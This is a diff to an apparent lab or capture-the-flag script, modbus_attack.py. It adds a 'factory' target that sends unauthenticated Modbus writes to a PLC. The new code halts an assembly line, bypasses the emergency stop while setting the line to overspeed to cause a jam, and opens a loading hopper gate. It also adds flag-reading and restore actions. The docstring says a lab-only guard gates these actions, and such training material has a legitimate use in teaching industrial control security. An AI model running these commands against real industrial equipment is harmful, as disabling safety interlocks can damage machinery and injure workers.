@@ -11,6 +11,12 @@
     modbus_attack.py power flag
     modbus_attack.py power restore
 
+    modbus_attack.py factory line-stop    # halt the assembly line
+    modbus_attack.py factory estop-bypass # bypass the e-stop + overspeed -> jam
+    modbus_attack.py factory hopper-dump  # open the loading hopper gate
+    modbus_attack.py factory flag
+    modbus_attack.py factory restore
+
 No auth, no validation - that is the lesson. Everything routes through the
 lab-only guard first.
 """
@@ -23,10 +29,11 @@ sys.path.insert(0, "/opt/pktr/scripts")
 from targets import guard  # noqa: E402
 
 HOST = "field-plc"
-WATER_PORT, POWER_PORT = 502, 503
+WATER_PORT, POWER_PORT, FACTORY_PORT = 502, 503, 504
 
 W = dict(INTAKE=0, HIGHLIFT=1, CHLORINE=2, MAIN_VALVE=3, MAINT=8, HIGHLIFT_SP=0, CHLORINE_SP=1)
 P = dict(MAIN=0, RES=1, BIZ=2, IND=3, ST=4, GEN=5, MAINT=8, GEN_SP=0)
+F = dict(LINE_RUN=0, ESTOP_BYPASS=1, GANTRY=2, HOPPER_GATE=3, MAINT=8, LINE_SPEED=0)
 FEEDER = {"residential": P["RES"], "business": P["BIZ"], "industrial": P["IND"], "streetlights": P["ST"]}
 FLAG_BASE, FLAG_LEN = 100, 32
 
@@ -85,6 +92,23 @@ def main():
             c.write_coil(P["MAINT"], False, slave=1); print("[+] power restored")
         else:
             sys.exit(f"unknown power action: {action}")
+    elif plant == "factory":
+        c = client(FACTORY_PORT)
+        if action == "line-stop":
+            c.write_coil(F["LINE_RUN"], False, slave=1); print("[+] assembly line halted")
+        elif action == "estop-bypass":
+            c.write_coil(F["ESTOP_BYPASS"], True, slave=1)
+            c.write_register(F["LINE_SPEED"], 99, slave=1); print("[+] e-stop bypassed, line overspeed")
+        elif action == "hopper-dump":
+            c.write_coil(F["HOPPER_GATE"], True, slave=1); print("[+] loading hopper gate opened")
+        elif action == "flag":
+            print(read_flag(c))
+        elif action == "restore":
+            c.write_coils(0, [True, False, True, False], slave=1)
+            c.write_register(F["LINE_SPEED"], 70, slave=1)
+            c.write_coil(F["MAINT"], False, slave=1); print("[+] factory restored")
+        else:
+            sys.exit(f"unknown factory action: {action}")
     else:
         sys.exit(f"unknown plant: {plant}")
 
